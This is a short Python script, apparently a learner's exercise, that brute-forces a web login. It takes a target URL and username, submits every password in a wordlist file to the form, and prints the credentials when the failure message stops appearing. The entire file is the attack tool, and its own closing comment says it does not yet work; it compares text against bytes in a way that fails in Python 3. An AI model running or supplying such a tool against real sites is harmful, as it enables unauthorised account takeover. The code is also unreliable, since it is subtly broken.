
import requests, signal, sys

#Password Bruteforcer

# Script for working with sites which require a CSRF token (next step - https://www.linkedin.com/pulse/python-scripting-cybersecurity-guide-brute-forcing-qdpm-kevin-vanegas/#)
#For now I'll create a basic script which does not use CSRF tokens

# requests makes HTTP requests easier to use

# defining a signal handler to handle the SIGINT signal. If the user 
# tries to interrupt the script by pressing CTRL+C, the script exits gracefully

def def_handler(sig, frame):
    print("\n\n[!] Exiting... \n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

login_url = input("Enter target URL: ")
username = input("Enter target username: ")
error = input("Enter error message for wrong password")

def makeBruteForce(login_url, username, error):

    f = open("passwd.txt", "r")

    for passwd in f.readlines():
        passwd = passwd.strip()
        print("Trying "+ passwd)

        data_dict = {"username" : username, "password": passwd, "login": "submit"}

        response = requests.post(login_url, data= data_dict)

        if error in response.content:
            pass
        elif "csrf" in response.content:
            print("CSRF token detected!! Bruteforce won't work on this website")
        else:
            print("Username: " + username)
            print("Password: " + passwd)
            exit()

makeBruteForce(login_url, username, error)
print("Password not found in Password list ")



# First attempt, getting errors but will get back to this.
